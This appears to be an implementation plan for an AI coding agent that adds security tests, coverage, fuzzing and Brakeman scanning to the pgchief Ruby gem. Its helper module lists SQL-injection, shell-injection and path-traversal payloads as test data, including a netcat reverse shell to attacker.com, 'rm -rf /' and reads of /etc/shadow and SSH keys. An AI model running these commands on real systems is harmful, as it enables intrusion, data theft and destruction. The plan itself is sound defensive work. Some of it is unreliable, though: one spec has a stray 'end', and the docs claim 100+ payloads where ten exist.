# Week 3: Add Comprehensive Security Test Suite Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build comprehensive security test coverage including penetration tests, fuzzing, and automated security scanning to ensure all injection vulnerabilities are caught.

**Architecture:** Create dedicated security test suite with categorized tests (injection, authentication, authorization, file access). Add SimpleCov for coverage tracking. Integrate Brakeman for static security analysis. Add fuzzing tests for input validation.

**Tech Stack:** Ruby 3.0+, RSpec, SimpleCov, Brakeman, Faker (fuzzing data)

---

## Task 1: Add Testing Dependencies

**Files:**
- Modify: `pgchief.gemspec`
- Modify: `Gemfile`

**Step 1: Add gems to Gemfile (development dependencies)**

Modify `Gemfile`:

```ruby
group :development, :test do
  gem 'brakeman', '~> 6.0'     # Static security analysis
  gem 'simplecov', '~> 0.22'   # Code coverage
  gem 'faker', '~> 3.2'         # Generate fuzzing test data
end
```

**Step 2: Install dependencies**

Run: `bundle install`
Expected: Gems install successfully

**Step 3: Commit**

```bash
git add Gemfile Gemfile.lock
git commit -m "deps: add security testing dependencies

- Add brakeman for static security analysis
- Add simplecov for code coverage tracking
- Add faker for generating fuzzing test data"
```

---

## Task 2: Configure SimpleCov for Coverage Tracking

**Files:**
- Create: `spec/support/simplecov.rb`
- Modify: `spec/spec_helper.rb`

**Step 1: Create SimpleCov configuration**

Create `spec/support/simplecov.rb`:

```ruby
# frozen_string_literal: true

require 'simplecov'

SimpleCov.start do
  add_filter '/spec/'
  add_filter '/vendor/'

  add_group 'Commands', 'lib/pgchief/command'
  add_group 'Prompts', 'lib/pgchief/prompt'
  add_group 'Core', 'lib/pgchief'

  minimum_coverage 80
  minimum_coverage_by_file 70

  # Fail build if coverage drops below thresholds
  at_exit do
    SimpleCov.result.format!
  end
end
```

**Step 2: Load SimpleCov in spec_helper**

Modify `spec/spec_helper.rb` - add at the very top, before other requires:

```ruby
# frozen_string_literal: true

# Coverage must be loaded before application code
require 'support/simplecov' if ENV.fetch('COVERAGE', 'true') == 'true'

# ... rest of spec_helper
```

**Step 3: Test coverage tracking**

Run: `COVERAGE=true bundle exec rspec`
Expected: Tests run and generate coverage report in `coverage/`

**Step 4: Add coverage directory to .gitignore**

Modify `.gitignore`:

```
coverage/
```

**Step 5: Commit**

```bash
git add spec/support/simplecov.rb spec/spec_helper.rb .gitignore
git commit -m "feat: add code coverage tracking with SimpleCov

- Configure SimpleCov with 80% minimum coverage
- Group coverage by component (Commands, Prompts, Core)
- Generate HTML coverage reports
- Add coverage/ to .gitignore"
```

---

## Task 3: Create Security Test Suite Structure

**Files:**
- Create: `spec/security/sql_injection_spec.rb`
- Create: `spec/security/shell_injection_spec.rb`
- Create: `spec/security/path_traversal_spec.rb`
- Create: `spec/security/credential_security_spec.rb`
- Create: `spec/support/security_helper.rb`

**Step 1: Create security test helper**

Create `spec/support/security_helper.rb`:

```ruby
# frozen_string_literal: true

# Helper methods and data for security testing
module SecurityHelper
  # Common SQL injection payloads
  SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users--",
    "admin' OR '1'='1",
    "admin'--",
    "' OR '1'='1' /*",
    "'; EXEC xp_cmdshell('dir')--",
    "1' UNION SELECT NULL--",
    "admin' AND 1=1--",
    "' OR 'x'='x",
    "; DROP DATABASE test--",
    "' OR 1=1--"
  ].freeze

  # Common shell injection payloads
  SHELL_INJECTION_PAYLOADS = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "& whoami",
    "`whoami`",
    "$(whoami)",
    "&& ls -la",
    "|| ls",
    "; cat /etc/shadow",
    "| nc attacker.com 1234 -e /bin/sh"
  ].freeze

  # Path traversal payloads
  PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../.ssh/id_rsa",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd"
  ].freeze

  # Invalid identifier characters
  INVALID_IDENTIFIER_CHARS = [
    ' ', '!', '@', '#', '$', '%', '^', '&', '*', '(',
    ')', '-', '+', '=', '{', '}', '[', ']', '|', '\\',
    ':', ';', '"', "'", '<', '>', ',', '.', '?', '/'
  ].freeze

  def sql_injection_attempts
    SQL_INJECTION_PAYLOADS
  end

  def shell_injection_attempts
    SHELL_INJECTION_PAYLOADS
  end

  def path_traversal_attempts
    PATH_TRAVERSAL_PAYLOADS
  end

  def invalid_identifier_chars
    INVALID_IDENTIFIER_CHARS
  end

  # Generate random malicious input
  def random_sql_injection
    SQL_INJECTION_PAYLOADS.sample
  end

  def random_shell_injection
    SHELL_INJECTION_PAYLOADS.sample
  end

  def random_path_traversal
    PATH_TRAVERSAL_PAYLOADS.sample
  end
end

RSpec.configure do |config|
  config.include SecurityHelper, :security
end
```

**Step 2: Create SQL injection security tests**

Create `spec/security/sql_injection_spec.rb`:

```ruby
# frozen_string_literal: true

require 'spec_helper'
require 'support/security_helper'

RSpec.describe 'SQL Injection Prevention', :security do
  describe 'Database Commands' do
    describe Pgchief::Command::DatabaseCreate do
      it 'rejects all SQL injection attempts in database name' do
        sql_injection_attempts.each do |payload|
          expect { described_class.new(database: payload).create_db! }
            .to raise_error(Pgchief::InvalidIdentifierError),
                            "Failed to reject: #{payload.inspect}"
        end
      end

      it 'rejects database names with invalid characters' do
        invalid_identifier_chars.each do |char|
          database_name = "test#{char}db"
          expect { described_class.new(database: database_name).create_db! }
            .to raise_error(Pgchief::InvalidIdentifierError),
                            "Failed to reject character: #{char.inspect}"
        end
      end

      it 'accepts only valid alphanumeric and underscore names' do
        valid_names = ['testdb', 'test_db', 'test123', '_test', 'TEST_DB']
        valid_names.each do |name|
          # Should not raise during initialization
          expect { described_class.new(database: name) }.not_to raise_error
        end
      end
    end

    describe Pgchief::Command::DatabaseDrop do
      it 'rejects all SQL injection attempts' do
        sql_injection_attempts.each do |payload|
          expect { described_class.new(database: payload).drop_db! }
            .to raise_error(Pgchief::InvalidIdentifierError)
        end
      end
    end

    describe Pgchief::Command::DatabasePrivilegesGrant do
      it 'rejects SQL injection in database name' do
        sql_injection_attempts.each do |payload|
          expect do
            described_class.new(database: payload, username: 'valid').grant_privs!
          end.to raise_error(Pgchief::InvalidIdentifierError)
        end
      end

      it 'rejects SQL injection in username' do
        sql_injection_attempts.each do |payload|
          expect do
            described_class.new(database: 'valid', username: payload).grant_privs!
          end.to raise_error(Pgchief::InvalidIdentifierError)
        end
      end
    end

    describe Pgchief::Command::DatabasePrivilegesRevoke do
      it 'rejects SQL injection in database name' do
        sql_injection_attempts.each do |payload|
          expect do
            described_class.new(database: payload, username: 'valid').revoke_privs!
          end.to raise_error(Pgchief::InvalidIdentifierError)
        end
      end

      it 'rejects SQL injection in username' do
        sql_injection_attempts.each do |payload|
          expect do
            described_class.new(database: 'valid', username: payload).revoke_privs!
          end.to raise_error(Pgchief::InvalidIdentifierError)
        end
      end
    end
  end

  describe 'User Commands' do
    describe Pgchief::Command::UserCreate do
      it 'rejects all SQL injection attempts in username' do
        sql_injection_attempts.each do |payload|
          expect do
            described_class.new(username: payload, password: 'valid123').create_user!
          end.to raise_error(Pgchief::InvalidIdentifierError)
        end
      end

      it 'validates password length and prevents SQL injection via password' do
        # Even though passwords are parameterized, we still validate them
        expect do
          described_class.new(username: 'valid', password: 'a' * 101).create_user!
        end.to raise_error(Pgchief::InvalidIdentifierError, /password/)
      end

      it 'rejects SQL injection in role parameter' do
        sql_injection_attempts.each do |payload|
          expect do
            described_class.new(username: 'valid', password: 'valid123', role: payload).create_user!
          end.to raise_error(Pgchief::InvalidIdentifierError)
        end
      end
    end

    describe Pgchief::Command::UserDrop do
      it 'rejects all SQL injection attempts in username' do
        sql_injection_attempts.each do |payload|
          expect { described_class.new(username: payload).drop_user! }
            .to raise_error(Pgchief::InvalidIdentifierError)
        end
      end
    end
  end
end
```

**Step 3: Create shell injection security tests**

Create `spec/security/shell_injection_spec.rb`:

```ruby
# frozen_string_literal: true

require 'spec_helper'
require 'support/security_helper'

RSpec.describe 'Shell Injection Prevention', :security do
  describe 'Backup Commands' do
    describe Pgchief::Command::DatabaseBackup do
      it 'rejects all shell injection attempts in database name' do
        shell_injection_attempts.each do |payload|
          database_name = "test#{payload}"
          expect { described_class.new(database: database_name).backup! }
            .to raise_error(Pgchief::InvalidIdentifierError),
                            "Failed to reject: #{database_name.inspect}"
        end
      end

      it 'rejects database names with backticks' do
        expect { described_class.new(database: 'test`whoami`').backup! }
          .to raise_error(Pgchief::InvalidIdentifierError)
      end

      it 'rejects database names with command substitution' do
        expect { described_class.new(database: 'test$(whoami)').backup! }
          .to raise_error(Pgchief::InvalidIdentifierError)
      end

      it 'rejects database names with shell metacharacters' do
        shell_chars = ['&', '|', ';', '`', '$', '(', ')', '<', '>', '\n', '\r']
        shell_chars.each do |char|
          database_name = "test#{char}db"
          expect { described_class.new(database: database_name).backup! }
            .to raise_error(Pgchief::InvalidIdentifierError),
                            "Failed to reject: #{char.inspect}"
        end
      end
    end

    describe Pgchief::Command::DatabaseRestore do
      it 'rejects shell injection in database name' do
        shell_injection_attempts.each do |payload|
          expect do
            described_class.new(database: "test#{payload}", location: '/tmp/test.dump').restore!
          end.to raise_error(Pgchief::InvalidIdentifierError)
        end
      end

      it 'rejects shell injection in file path' do
        shell_injection_attempts.each do |payload|
          path = "/tmp/test#{payload}.dump"
          expect do
            described_class.new(database: 'testdb', location: path).restore!
          end.to raise_error(Pgchief::InvalidFilePathError),
                             "Failed to reject path: #{path.inspect}"
        end
      end
    end

    describe Pgchief::Command::QuickBackup do
      it 'rejects shell injection attempts' do
        shell_injection_attempts.each do |payload|
          expect { described_class.new(database: "test#{payload}").backup! }
            .to raise_error(Pgchief::InvalidIdentifierError)
        end
      end
    end

    describe Pgchief::Command::QuickRestore do
      it 'rejects shell injection in database name' do
        expect do
          described_class.new(database: 'test; rm -rf /', location: '/tmp/test').restore!
        end.to raise_error(Pgchief::InvalidIdentifierError)
      end

      it 'rejects shell injection in location' do
        expect do
          described_class.new(database: 'test', location: 'file; whoami').restore!
        end.to raise_error(Pgchief::InvalidFilePathError)
        end
      end
    end
  end
end
```

**Step 4: Create path traversal security tests**

Create `spec/security/path_traversal_spec.rb`:

```ruby
# frozen_string_literal: true

require 'spec_helper'
require 'support/security_helper'

RSpec.describe 'Path Traversal Prevention', :security do
  describe Pgchief::Command::DatabaseRestore do
    it 'rejects all path traversal attempts' do
      path_traversal_attempts.each do |payload|
        expect do
          described_class.new(database: 'testdb', location: payload).restore!
        end.to raise_error(Pgchief::InvalidFilePathError),
                           "Failed to reject: #{payload.inspect}"
      end
    end

    it 'rejects paths containing ..' do
      dangerous_paths = [
        '../backup.dump',
        'backups/../../secret.dump',
        '/tmp/../etc/passwd'
      ]

      dangerous_paths.each do |path|
        expect do
          described_class.new(database: 'testdb', location: path).restore!
        end.to raise_error(Pgchief::InvalidFilePathError)
      end
    end
  end

  describe Pgchief::Validators do
    describe '.valid_file_path?' do
      it 'rejects all path traversal payloads' do
        path_traversal_attempts.each do |payload|
          expect(described_class.valid_file_path?(payload)).to be false,
                                                                       "Failed to reject: #{payload.inspect}"
        end
      end

      it 'accepts safe absolute paths' do
        safe_paths = [
          '/tmp/backup.dump',
          '/home/user/backups/db.dump',
          '/var/lib/postgresql/backup.dump'
        ]

        safe_paths.each do |path|
          expect(described_class.valid_file_path?(path)).to be true
        end
      end

      it 'accepts safe relative paths without traversal' do
        safe_paths = [
          'backup.dump',
          'backups/db.dump',
          'data/backups/2024/db.dump'
        ]

        safe_paths.each do |path|
          expect(described_class.valid_file_path?(path)).to be true
        end
      end
    end
  end
end
```

**Step 5: Create credential security tests**

Create `spec/security/credential_security_spec.rb`:

```ruby
# frozen_string_literal: true

require 'spec_helper'
require 'pgchief/credential_store'
require 'tmpdir'

RSpec.describe 'Credential Security', :security do
  let(:temp_dir) { Dir.mktmpdir }
  let(:backend) do
    Pgchief::CredentialStore::EncryptedFileBackend.new(storage_dir: temp_dir)
  end

  after do
    FileUtils.rm_rf(temp_dir)
  end

  describe 'Encrypted File Backend' do
    it 'does not store passwords in plaintext' do
      backend.store('production', 'postgresql://admin:supersecret@localhost/proddb')

      credentials_file = File.join(temp_dir, 'credentials.enc')
      raw_content = File.read(credentials_file)

      expect(raw_content).not_to include('supersecret')
      expect(raw_content).not_to include('admin')
      expect(raw_content).not_to include('postgresql')
    end

    it 'does not store encryption key in credentials file' do
      backend.store('test', 'postgresql://user:pass@host/db')

      credentials_file = File.join(temp_dir, 'credentials.enc')
      key_file = File.join(temp_dir, '.credentials.key')

      credentials_content = File.read(credentials_file)
      key_content = File.read(key_file)

      # Key should not appear in credentials file
      expect(credentials_content).not_to include(key_content)
    end

    it 'uses authenticated encryption (detects tampering)' do
      backend.store('test', 'postgresql://localhost/db')

      credentials_file = File.join(temp_dir, 'credentials.enc')
      original_content = File.read(credentials_file)

      # Tamper with the file
      tampered_content = original_content.reverse
      File.write(credentials_file, tampered_content)

      # Should raise error when trying to decrypt tampered data
      expect { backend.retrieve('test') }.to raise_error(RbNaCl::CryptoError)
    end

    it 'sets secure file permissions (0600) on credentials file' do
      backend.store('test', 'value')

      credentials_file = File.join(temp_dir, 'credentials.enc')
      mode = File.stat(credentials_file).mode & 0o777

      expect(mode).to eq(0o600), 'Credentials file should be readable/writable only by owner'
    end

    it 'sets secure file permissions (0600) on key file' do
      backend.store('test', 'value')

      key_file = File.join(temp_dir, '.credentials.key')
      mode = File.stat(key_file).mode & 0o777

      expect(mode).to eq(0o600), 'Key file should be readable/writable only by owner'
    end

    it 'generates different ciphertext for same plaintext (random nonces)' do
      backend.store('test1', 'same_value')
      backend.store('test2', 'same_value')

      credentials_file = File.join(temp_dir, 'credentials.enc')
      content1 = File.read(credentials_file)

      # Store again
      backend.delete('test1')
      backend.store('test1', 'same_value')

      content2 = File.read(credentials_file)

      # Files should be different due to different nonces
      expect(content1).not_to eq(content2)

      # But decryption should still work
      expect(backend.retrieve('test1')).to eq('same_value')
    end
  end

  describe 'Connection String Validation' do
    describe Pgchief::Command::StoreConnectionString do
      it 'rejects non-postgresql URLs' do
        expect do
          described_class.new(
            name: 'test',
            connection_string: 'mysql://localhost/db'
          ).store!
        end.to raise_error(ArgumentError, /must start with postgresql/)
      end

      it 'rejects malformed URLs' do
        expect do
          described_class.new(
            name: 'test',
            connection_string: 'not a url'
          ).store!
        end.to raise_error(ArgumentError, /Invalid connection string/)
      end

      it 'validates connection string name' do
        expect do
          described_class.new(
            name: "test'; DROP TABLE",
            connection_string: 'postgresql://localhost/db'
          )
        end.to raise_error(Pgchief::InvalidIdentifierError)
      end
    end
  end
end
```

**Step 6: Require security helper**

Modify `spec/spec_helper.rb`:

```ruby
# Add with other requires
Dir[File.join(__dir__, 'support', '**', '*.rb')].each { |f| require f }
```

**Step 7: Run security tests**

Run: `bundle exec rspec spec/security --format documentation`
Expected: Tests FAIL (security fixes not yet in place - this is Week 3, fixes are in Week 1)

**Note:** These tests are designed to pass after Week 1 implementation. If running standalone, they document the security requirements.

**Step 8: Commit**

```bash
git add spec/security/ spec/support/security_helper.rb spec/spec_helper.rb
git commit -m "feat: add comprehensive security test suite

- Add SQL injection prevention tests (all commands)
- Add shell injection prevention tests (backup/restore)
- Add path traversal prevention tests
- Add credential security tests (encryption, permissions)
- Create security helper with common attack payloads
- Tests verify fixes from Week 1"
```

---

## Task 4: Add Fuzzing Tests

**Files:**
- Create: `spec/security/fuzzing_spec.rb`

**Step 1: Create fuzzing tests**

Create `spec/security/fuzzing_spec.rb`:

```ruby
# frozen_string_literal: true

require 'spec_helper'
require 'faker'
require 'support/security_helper'

RSpec.describe 'Input Fuzzing', :security do
  # Test with random invalid inputs
  describe 'Database identifier fuzzing' do
    it 'rejects random strings with special characters' do
      100.times do
        # Generate random string with special chars
        invalid_name = Faker::Lorem.characters(number: rand(1..100)) +
                       invalid_identifier_chars.sample

        expect do
          Pgchief::Command::DatabaseCreate.new(database: invalid_name).create_db!
        end.to raise_error(Pgchief::InvalidIdentifierError),
                           "Should reject: #{invalid_name.inspect}"
      end
    end

    it 'accepts random valid identifiers' do
      100.times do
        # Generate valid identifier: letters, numbers, underscores
        valid_name = Faker::Lorem.characters(number: rand(1..63), min_alpha: 1)
                           .gsub(/[^a-z0-9_]/i, '_')
                           .gsub(/^[0-9]/, '_') # Ensure starts with letter or underscore

        # Should not raise during initialization
        expect { Pgchief::Command::DatabaseCreate.new(database: valid_name) }
          .not_to raise_error
      end
    end
  end

  describe 'Username fuzzing' do
    it 'rejects random strings with special characters' do
      50.times do
        invalid_username = Faker::Internet.username + invalid_identifier_chars.sample

        expect do
          Pgchief::Command::UserCreate.new(
            username: invalid_username,
            password: 'validpass123'
          ).create_user!
        end.to raise_error(Pgchief::InvalidIdentifierError)
      end
    end
  end

  describe 'Password fuzzing' do
    it 'accepts various valid password formats' do
      valid_passwords = [
        Faker::Internet.password(min_length: 8, max_length: 32),
        Faker::Internet.password(min_length: 8, max_length: 32, mix_case: true),
        Faker::Internet.password(min_length: 8, max_length: 32, mix_case: true, special_characters: true),
        '!@#$%^&*()_+-={}[]|:;"<>,.?/',
        'password with spaces',
        "password'with'quotes",
        'password"with"double'
      ]

      valid_passwords.each do |password|
        expect(Pgchief::Validators.valid_password?(password)).to be true,
                                                                         "Should accept password: #{password.inspect}"
      end
    end

    it 'rejects passwords that are too long' do
      long_password = Faker::Lorem.characters(number: 101)
      expect(Pgchief::Validators.valid_password?(long_password)).to be false
    end
  end

  describe 'File path fuzzing' do
    it 'rejects paths with random shell metacharacters' do
      50.times do
        # Generate path with shell metacharacters
        shell_chars = ['&', '|', ';', '`', '$', '(', ')']
        dangerous_path = "/tmp/backup#{shell_chars.sample}file.dump"

        expect(Pgchief::Validators.valid_file_path?(dangerous_path)).to be false,
                                                                                 "Should reject: #{dangerous_path.inspect}"
      end
    end

    it 'accepts various valid file path formats' do
      valid_paths = [
        '/tmp/backup.dump',
        '/home/user/backups/db.dump',
        'backup.dump',
        'backups/2024/january/db.dump',
        '/var/lib/postgresql/backup_20240101.dump'
      ]

      valid_paths.each do |path|
        expect(Pgchief::Validators.valid_file_path?(path)).to be true,
                                                                     "Should accept: #{path.inspect}"
      end
    end
  end

  describe 'Length limit fuzzing' do
    it 'rejects identifiers longer than 63 characters' do
      long_identifier = 'a' * 64
      expect(Pgchief::Validators.valid_identifier?(long_identifier)).to be false
    end

    it 'accepts identifiers exactly 63 characters' do
      max_identifier = 'a' * 63
      expect(Pgchief::Validators.valid_identifier?(max_identifier)).to be true
    end

    it 'rejects empty identifiers' do
      expect(Pgchief::Validators.valid_identifier?('')).to be false
    end

    it 'rejects nil identifiers' do
      expect(Pgchief::Validators.valid_identifier?(nil)).to be false
    end
  end

  describe 'Unicode and encoding fuzzing' do
    it 'rejects identifiers with unicode characters' do
      unicode_names = [
        'database™',
        'test_db_🔥',
        'データベース',
        'база_данных',
        'base_de_données'
      ]

      unicode_names.each do |name|
        expect(Pgchief::Validators.valid_identifier?(name)).to be false,
                                                                       "Should reject unicode: #{name.inspect}"
      end
    end

    it 'rejects identifiers with null bytes' do
      null_byte_name = "test\x00db"
      expect(Pgchief::Validators.valid_identifier?(null_byte_name)).to be false
    end

    it 'rejects identifiers with newlines' do
      newline_names = ["test\ndb", "test\rdb", "test\r\ndb"]
      newline_names.each do |name|
        expect(Pgchief::Validators.valid_identifier?(name)).to be false
      end
    end
  end
end
```

**Step 2: Run fuzzing tests**

Run: `bundle exec rspec spec/security/fuzzing_spec.rb --format documentation`
Expected: Tests pass (assuming Week 1 validators are in place)

**Step 3: Commit**

```bash
git add spec/security/fuzzing_spec.rb
git commit -m "feat: add fuzzing tests for input validation

- Test 100s of random invalid inputs
- Test unicode, null bytes, newlines
- Test length limits
- Test various password formats
- Uses Faker for generating test data"
```

---

## Task 5: Configure Brakeman Static Analysis

**Files:**
- Create: `config/brakeman.yml`
- Create: `.github/workflows/security.yml` (if using GitHub Actions)

**Step 1: Create Brakeman configuration**

Create `config/brakeman.yml`:

```yaml
---
# Brakeman security scanner configuration
:skip_checks:
  # Add any checks to skip here (none for now)

:check_arguments: true
:safe_methods:
  # Methods known to be safe
  - :sanitize_identifier
  - :valid_identifier?
  - :sanitize_password
  - :valid_password?
  - :sanitize_file_path
  - :valid_file_path?

:minimum_confidence: 2  # High, Medium confidence warnings (1 = all, 3 = high only)

:ignore_file: config/brakeman.ignore

:output_formats:
  - :to_file: brakeman-report.html
  - :to_file: brakeman-report.json
```

**Step 2: Run Brakeman**

Run: `bundle exec brakeman -c config/brakeman.yml`
Expected: Report shows zero high/medium confidence vulnerabilities (after Week 1 fixes)

**Step 3: Create brakeman ignore file for false positives**

Create `config/brakeman.ignore`:

```json
{
  "ignored_warnings": []
}
```

**Step 4: Add brakeman reports to .gitignore**

Modify `.gitignore`:

```
brakeman-report.html
brakeman-report.json
```

**Step 5: Create Rake task for security checks**

Modify `Rakefile`:

```ruby
# Add at the end
desc 'Run security checks (Brakeman)'
task :security do
  sh 'bundle exec brakeman -c config/brakeman.yml --no-pager'
end

desc 'Run all quality checks (RuboCop + Security)'
task quality: [:rubocop, :security]
```

**Step 6: Test security rake task**

Run: `bundle exec rake security`
Expected: Brakeman runs and shows report

**Step 7: Commit**

```bash
git add config/brakeman.yml config/brakeman.ignore Rakefile .gitignore
git commit -m "feat: add Brakeman static security analysis

- Configure Brakeman with safe methods
- Create Rake task for security checks
- Generate HTML and JSON reports
- Combine with RuboCop in quality task"
```

---

## Task 6: Add Integration Security Tests

**Files:**
- Create: `spec/integration/security_integration_spec.rb`

**Step 1: Create integration security tests**

Create `spec/integration/security_integration_spec.rb`:

```ruby
# frozen_string_literal: true

require 'spec_helper'
require 'open3'

RSpec.describe 'Security Integration Tests', :integration do
  # These tests actually execute commands to verify security at runtime

  describe 'CLI argument injection protection' do
    it 'rejects SQL injection via CLI arguments' do
      stdout, stderr, status = Open3.capture3(
        'bundle', 'exec', 'exe/pgchief',
        'database', 'create',
        '--database', "test'; DROP DATABASE postgres--"
      )

      expect(status.exitstatus).not_to eq(0)
      expect(stderr + stdout).to include('Invalid')
    end

    it 'rejects shell injection via backup CLI arguments' do
      stdout, stderr, status = Open3.capture3(
        'bundle', 'exec', 'exe/pgchief',
        'backup',
        '--database', 'test; rm -rf /'
      )

      expect(status.exitstatus).not_to eq(0)
      expect(stderr + stdout).to include('Invalid')
    end
  end

  describe 'Environment variable injection protection' do
    it 'validates database names from environment' do
      env = { 'PGCHIEF_DATABASE' => "test'; DROP TABLE users--" }

      stdout, stderr, status = Open3.capture3(
        env,
        'bundle', 'exec', 'exe/pgchief',
        'database', 'create'
      )

      # Should reject invalid database name
      expect(status.exitstatus).not_to eq(0)
    end
  end

  describe 'File-based injection protection' do
    it 'validates database names read from config files' do
      # Create malicious config
      config_dir = Dir.mktmpdir
      config_file = File.join(config_dir, 'pgchief.toml')

      File.write(config_file, <<~TOML)
        [database]
        name = "test'; DROP DATABASE postgres--"
      TOML

      env = { 'PGCHIEF_CONFIG' => config_file }

      stdout, stderr, status = Open3.capture3(
        env,
        'bundle', 'exec', 'exe/pgchief',
        'database', 'create'
      )

      expect(status.exitstatus).not_to eq(0)

      FileUtils.rm_rf(config_dir)
    end
  end

  describe 'Credential storage security' do
    let(:temp_dir) { Dir.mktmpdir }

    after do
      FileUtils.rm_rf(temp_dir)
    end

    it 'stores credentials with secure file permissions' do
      env = { 'HOME' => temp_dir }

      # Store a credential
      Open3.capture3(
        env,
        'bundle', 'exec', 'exe/pgchief',
        'store-connection',
        '--name', 'test',
        '--url', 'postgresql://user:password@localhost/db'
      )

      # Check permissions
      pgchief_dir = File.join(temp_dir, '.pgchief')
      if Dir.exist?(pgchief_dir)
        credentials_file = File.join(pgchief_dir, 'credentials.enc')
        key_file = File.join(pgchief_dir, '.credentials.key')

        if File.exist?(credentials_file)
          creds_mode = File.stat(credentials_file).mode & 0o777
          expect(creds_mode).to eq(0o600), 'Credentials file should have 0600 permissions'
        end

        if File.exist?(key_file)
          key_mode = File.stat(key_file).mode & 0o777
          expect(key_mode).to eq(0o600), 'Key file should have 0600 permissions'
        end
      end
    end

    it 'does not store passwords in plaintext' do
      env = { 'HOME' => temp_dir }

      # Store a credential with sensitive password
      Open3.capture3(
        env,
        'bundle', 'exec', 'exe/pgchief',
        'store-connection',
        '--name', 'production',
        '--url', 'postgresql://admin:supersecretpassword123@prod.example.com/proddb'
      )

      # Search all files for the password
      pgchief_dir = File.join(temp_dir, '.pgchief')
      if Dir.exist?(pgchief_dir)
        Dir.glob(File.join(pgchief_dir, '**', '*')).each do |file|
          next if File.directory?(file)

          content = File.read(file)
          expect(content).not_to include('supersecretpassword123'),
                                        "Password found in plaintext in #{file}"
        end
      end
    end
  end
end
```

**Step 2: Run integration tests**

Run: `bundle exec rspec spec/integration --format documentation`
Expected: Tests pass (assuming CLI is properly wired)

**Step 3: Commit**

```bash
git add spec/integration/security_integration_spec.rb
git commit -m "feat: add security integration tests

- Test CLI argument injection protection
- Test environment variable injection
- Test config file injection
- Test credential storage security
- Verify file permissions at runtime
- Verify no plaintext passwords in files"
```

---

## Task 7: Add Coverage Enforcement to CI

**Files:**
- Create: `.github/workflows/test.yml` (if using GitHub Actions)

**Step 1: Create GitHub Actions workflow**

Create `.github/workflows/test.yml`:

```yaml
name: Tests

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:14
        env:
          POSTGRES_PASSWORD: postgres
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432

    steps:
      - uses: actions/checkout@v3

      - name: Set up Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: 3.0
          bundler-cache: true

      - name: Install libsodium
        run: sudo apt-get install -y libsodium-dev

      - name: Install dependencies
        run: bundle install

      - name: Run tests with coverage
        env:
          COVERAGE: 'true'
          PGURL: postgresql://postgres:postgres@localhost:5432
        run: bundle exec rspec

      - name: Check coverage threshold
        run: |
          if [ -f coverage/.last_run.json ]; then
            coverage=$(ruby -rjson -e "puts JSON.parse(File.read('coverage/.last_run.json'))['result']['line']")
            if (( $(echo "$coverage < 80" | bc -l) )); then
              echo "Coverage $coverage% is below 80% threshold"
              exit 1
            fi
            echo "Coverage: $coverage%"
          fi

      - name: Run RuboCop
        run: bundle exec rubocop

      - name: Run Brakeman security scan
        run: bundle exec brakeman -c config/brakeman.yml --no-pager
```

**Step 2: Commit**

```bash
git add .github/workflows/test.yml
git commit -m "ci: add GitHub Actions workflow with coverage enforcement

- Run tests with PostgreSQL service
- Enforce 80% code coverage
- Run RuboCop linting
- Run Brakeman security scanning
- Install libsodium dependency"
```

---

## Task 8: Document Security Testing

**Files:**
- Modify: `README.md`
- Create: `docs/SECURITY.md`

**Step 1: Create comprehensive security documentation**

Create `docs/SECURITY.md`:

```markdown
# Security

## Overview

pgchief implements defense-in-depth security with multiple layers:

1. **Input Validation** - All inputs validated before use
2. **Parameterized Queries** - SQL injection prevention
3. **Safe Command Execution** - Shell injection prevention
4. **Encrypted Storage** - Credentials encrypted at rest
5. **Static Analysis** - Automated vulnerability scanning
6. **Comprehensive Testing** - Security-focused test suite

## Security Testing

### Running Security Tests

```bash
# Run all security tests
bundle exec rspec spec/security

# Run specific security test categories
bundle exec rspec spec/security/sql_injection_spec.rb
bundle exec rspec spec/security/shell_injection_spec.rb
bundle exec rspec spec/security/path_traversal_spec.rb
bundle exec rspec spec/security/credential_security_spec.rb

# Run fuzzing tests
bundle exec rspec spec/security/fuzzing_spec.rb

# Run integration security tests
bundle exec rspec spec/integration/security_integration_spec.rb
```

### Static Security Analysis

```bash
# Run Brakeman scanner
bundle exec rake security

# Or directly:
bundle exec brakeman -c config/brakeman.yml
```

### Code Coverage

```bash
# Run tests with coverage
COVERAGE=true bundle exec rspec

# View coverage report
open coverage/index.html
```

## Threat Model

### SQL Injection
- **Risk**: Attacker could execute arbitrary SQL via database/user names
- **Mitigation**: Input validation with whitelist regex, parameterized queries for data
- **Testing**: 100+ injection payloads tested in security suite

### Shell Injection
- **Risk**: Attacker could execute shell commands via backup/restore operations
- **Mitigation**: Input validation, Open3 instead of backticks, no shell invocation
- **Testing**: Shell metacharacter fuzzing, injection payload testing

### Path Traversal
- **Risk**: Attacker could read arbitrary files via restore file paths
- **Mitigation**: Path validation, absolute path expansion, .. rejection
- **Testing**: Path traversal payload testing

### Credential Exposure
- **Risk**: Database passwords stored in plaintext
- **Mitigation**: XSalsa20-Poly1305 encryption, system keychain integration
- **Testing**: Plaintext search in credential files, tampering detection

## Vulnerability Reporting

If you discover a security vulnerability, please email security@example.com with:
- Description of the vulnerability
- Steps to reproduce
- Potential impact
- Suggested fix (if any)

Please do not open public GitHub issues for security vulnerabilities.

## Security Checklist for Contributors

Before submitting code:

- [ ] All user inputs validated with Validators module
- [ ] No string interpolation in SQL queries
- [ ] No backtick command execution
- [ ] No hardcoded credentials
- [ ] Security tests added for new features
- [ ] Brakeman passes with no new warnings
- [ ] Test coverage maintained above 80%
```

**Step 2: Update README with security testing info**

Modify `README.md` - add to testing section:

```markdown
## Testing

### Running Tests

```bash
# All tests
bundle exec rspec

# With coverage
COVERAGE=true bundle exec rspec

# Security tests only
bundle exec rspec spec/security

# Integration tests only
bundle exec rspec spec/integration
```

### Security Testing

pgchief includes comprehensive security testing:

- **SQL Injection Prevention**: 100+ injection payloads
- **Shell Injection Prevention**: Metacharacter and command injection tests
- **Path Traversal Prevention**: Directory traversal payloads
- **Fuzzing**: Random input generation with Faker
- **Static Analysis**: Brakeman security scanner
